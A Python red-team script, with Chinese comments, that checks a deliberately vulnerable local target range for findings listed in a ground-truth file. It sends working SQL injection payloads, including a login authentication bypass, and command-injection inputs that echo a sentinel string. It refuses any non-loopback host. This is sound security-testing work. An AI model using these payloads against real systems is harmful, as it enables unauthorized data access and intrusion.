"""红队基线扫描：对 verifix-target 靶场做独立工具复现，用于与 ground_truth 对账。

用法（靶场需先在 127.0.0.1:5055 运行）：
    python scripts/redteam_target_baseline.py --base http://127.0.0.1:5055 \
        --out .evidence/redteam-baseline

判定原则（不依赖扫描器，全部为可直接重跑的黑盒请求）：
    SQLi   -> 注入后返回行数/匹配数大于基线，或布尔真假可区分
    命令注入 -> 响应中出现哨兵串 VF_MARKER_<随机>，或退出码由非零变零

只对 127.0.0.1 / localhost 生效；目标不在回环地址时直接退出。
"""

from __future__ import annotations

import argparse
import json
import random
import string
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

MARKER = "VF_MARKER_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


def _request(base: str, path: str, params: dict | None = None, form: dict | None = None,
             timeout: float = 8.0) -> tuple[int | None, str]:
    url = base.rstrip("/") + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001 - 网络异常一律记为不可达
        return None, f"{type(exc).__name__}: {exc}"


def _json_rows(body: str) -> int:
    try:
        payload = json.loads(body)
    except Exception:
        return -1
    if isinstance(payload, list):
        return len(payload)
    if isinstance(payload, dict):
        return len(payload.get("stdout") or "") + len(payload.get("output") or "")
    return -1


def _json_count(body: str) -> int:
    try:
        payload = json.loads(body)
    except Exception:
        return -1
    if isinstance(payload, list) and payload and isinstance(payload[0], list):
        return payload[0][0] if isinstance(payload[0][0], int) else -1
    return -1


def run(base: str) -> list[dict]:
    results: list[dict] = []

    def record(tgt: str, route: str, payload: str, baseline: str, attack: str,
               verdict: str, why: str, method: str = "GET") -> None:
        results.append({
            "target_id": tgt, "route": route, "method": method,
            "payload": payload, "baseline": baseline, "attack": attack,
            "verdict": verdict, "reason": why,
        })

    # ---- TGT-001 /user  uid 单引号拼接 ----
    s0, b0 = _request(base, "/user", {"uid": "1"})
    s1, b1 = _request(base, "/user", {"uid": "1' OR '1'='1"})
    n0, n1 = _json_rows(b0), _json_rows(b1)
    record("TGT-001", "/user", "uid=1' OR '1'='1", f"{s0} rows={n0}", f"{s1} rows={n1}",
           "REPRODUCED" if n1 > n0 >= 0 else "NOT_REPRODUCED",
           f"行数 {n0} -> {n1}（注入后返回全表即成立）")

    # ---- TGT-002 /login username 单引号拼接 ----
    s0, b0 = _request(base, "/login", form={"username": "alice", "password": "wrong"})
    s1, b1 = _request(base, "/login", form={"username": "alice' OR '1'='1'-- -", "password": "x"})
    m0 = json.loads(b0).get("matched", -1) if b0.strip().startswith("{") else -1
    m1 = json.loads(b1).get("matched", -1) if b1.strip().startswith("{") else -1
    record("TGT-002", "/login", "username=alice' OR '1'='1'-- -", f"{s0} matched={m0}",
           f"{s1} matched={m1}",
           "REPRODUCED" if m1 > m0 else "NOT_REPRODUCED",
           f"matched {m0} -> {m1}（错误口令仍匹配即绕过认证）", method="POST")

    # ---- TGT-003 /search LIKE 拼接 ----
    s0, b0 = _request(base, "/search", {"q": "zzzz_no_such"})
    s1, b1 = _request(base, "/search", {"q": "' OR '1'='1' --"})
    n0, n1 = _json_rows(b0), _json_rows(b1)
    record("TGT-003", "/search", "q=' OR '1'='1' --", f"{s0} rows={n0}", f"{s1} rows={n1}",
           "REPRODUCED" if n1 > n0 >= 0 else "NOT_REPRODUCED", f"行数 {n0} -> {n1}")

    # ---- TGT-004 /order 数字直接拼接 ----
    s0, b0 = _request(base, "/order", {"order_id": "1"})
    s1, b1 = _request(base, "/order", {"order_id": "0 OR 1=1"})
    n0, n1 = _json_rows(b0), _json_rows(b1)
    record("TGT-004", "/order", "order_id=0 OR 1=1", f"{s0} rows={n0}", f"{s1} rows={n1}",
           "REPRODUCED" if n1 > n0 >= 0 else "NOT_REPRODUCED", f"行数 {n0} -> {n1}")

    # ---- TGT-005 /report 日期拼接 ----
    s0, b0 = _request(base, "/report", {"day": "1999-01-01"})
    s1, b1 = _request(base, "/report", {"day": "' OR '1'='1' --"})
    c0, c1 = _json_count(b0), _json_count(b1)
    record("TGT-005", "/report", "day=' OR '1'='1' --", f"{s0} count={c0}", f"{s1} count={c1}",
           "REPRODUCED" if c1 > c0 >= 0 else "NOT_REPRODUCED", f"COUNT {c0} -> {c1}")

    # ---- TGT-006 /profile f-string 数字拼接 ----
    s0, b0 = _request(base, "/profile", {"id": "1"})
    s1, b1 = _request(base, "/profile", {"id": "0 OR 1=1"})
    n0, n1 = _json_rows(b0), _json_rows(b1)
    record("TGT-006", "/profile", "id=0 OR 1=1", f"{s0} rows={n0}", f"{s1} rows={n1}",
           "REPRODUCED" if n1 > n0 >= 0 else "NOT_REPRODUCED", f"行数 {n0} -> {n1}")

    # ---- TGT-007 /ping os.popen 命令拼接（哨兵串）----
    s0, b0 = _request(base, "/ping", {"host": "127.0.0.1"})
    s1, b1 = _request(base, "/ping", {"host": f"127.0.0.1 & echo {MARKER}"})
    record("TGT-007", "/ping", f"host=127.0.0.1 & echo {MARKER}", f"{s0} marker={MARKER in b0}",
           f"{s1} marker={MARKER in b1}",
           "REPRODUCED" if MARKER in b1 and MARKER not in b0 else "NOT_REPRODUCED",
           "响应中出现哨兵串即证明命令被执行")

    # ---- TGT-008 /convert shell=True 无回显，用退出码判定 ----
    s0, b0 = _request(base, "/convert", {"name": "sample.png"})
    s1, b1 = _request(base, "/convert", {"name": f"x & exit 0"})
    e0 = json.loads(b0).get("exit_code", -999) if b0.strip().startswith("{") else -999
    e1 = json.loads(b1).get("exit_code", -999) if b1.strip().startswith("{") else -999
    record("TGT-008", "/convert", "name=x & exit 0", f"{s0} exit={e0}", f"{s1} exit={e1}",
           "REPRODUCED" if e1 == 0 and e0 != 0 else "NOT_REPRODUCED",
           f"退出码 {e0} -> {e1}（exit 0 被执行说明 & 后被当作命令）")

    # ---- TGT-009 /backup os.popen tar 拼接 ----
    s0, b0 = _request(base, "/backup", {"folder": "data"})
    s1, b1 = _request(base, "/backup", {"folder": f"data & echo {MARKER}"})
    record("TGT-009", "/backup", f"folder=data & echo {MARKER}", f"{s0} marker={MARKER in b0}",
           f"{s1} marker={MARKER in b1}",
           "REPRODUCED" if MARKER in b1 and MARKER not in b0 else "NOT_REPRODUCED",
           "响应中出现哨兵串即证明命令被执行")

    # ---- TGT-010 /deploy shell=True 带 stdout 回显 ----
    s0, b0 = _request(base, "/deploy", form={"env": "staging"})
    s1, b1 = _request(base, "/deploy", form={"env": f"staging & echo {MARKER}"})
    record("TGT-010", "/deploy", f"env=staging & echo {MARKER}", f"{s0} marker={MARKER in b0}",
           f"{s1} marker={MARKER in b1}",
           "REPRODUCED" if MARKER in b1 and MARKER not in b0 else "NOT_REPRODUCED",
           "stdout 中出现哨兵串即证明命令被执行", method="POST")

    return results


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:5055")
    parser.add_argument("--out", default=".evidence/redteam-baseline")
    parser.add_argument("--ground-truth", default="verifix-target/ground_truth.json")
    args = parser.parse_args()

    host = urllib.parse.urlparse(args.base).hostname or ""
    if host not in {"127.0.0.1", "localhost", "::1"}:
        print(f"拒绝执行：目标 {host} 不在回环地址", file=sys.stderr)
        return 4

    results = run(args.base)

    gt_ids: list[str] = []
    gt_path = Path(args.ground_truth)
    if gt_path.is_file():
        gt_ids = [item["id"] for item in json.loads(gt_path.read_text(encoding="utf-8"))["items"]]

    reproduced = [r for r in results if r["verdict"] == "REPRODUCED"]
    scope = [r for r in results if r["target_id"] in gt_ids] if gt_ids else results
    summary = {
        "marker": MARKER,
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "base": args.base,
        "tested": len(results),
        "reproduced": len(reproduced),
        "in_ground_truth_scope": len(scope),
        "reproduced_in_scope": len([r for r in scope if r["verdict"] == "REPRODUCED"]),
        "not_reproduced": [r["target_id"] for r in results if r["verdict"] != "REPRODUCED"],
    }

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%dT%H%M%S")
    payload = {"summary": summary, "results": results}
    json_path = out_dir / f"RT-{stamp}.json"
    json_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")

    print(json.dumps(summary, ensure_ascii=False, indent=2))
    for row in results:
        flag = "OK " if row["verdict"] == "REPRODUCED" else "MISS"
        print(f"[{flag}] {row['target_id']} {row['method']} {row['route']:<10} {row['payload']}")
        print(f"        baseline: {row['baseline']}")
        print(f"        attack  : {row['attack']}")
        print(f"        reason  : {row['reason']}")
    print(f"\n证据已写入 {json_path}")

    return 0 if summary["reproduced_in_scope"] == summary["in_ground_truth_scope"] > 0 else 2


if __name__ == "__main__":
    raise SystemExit(main())
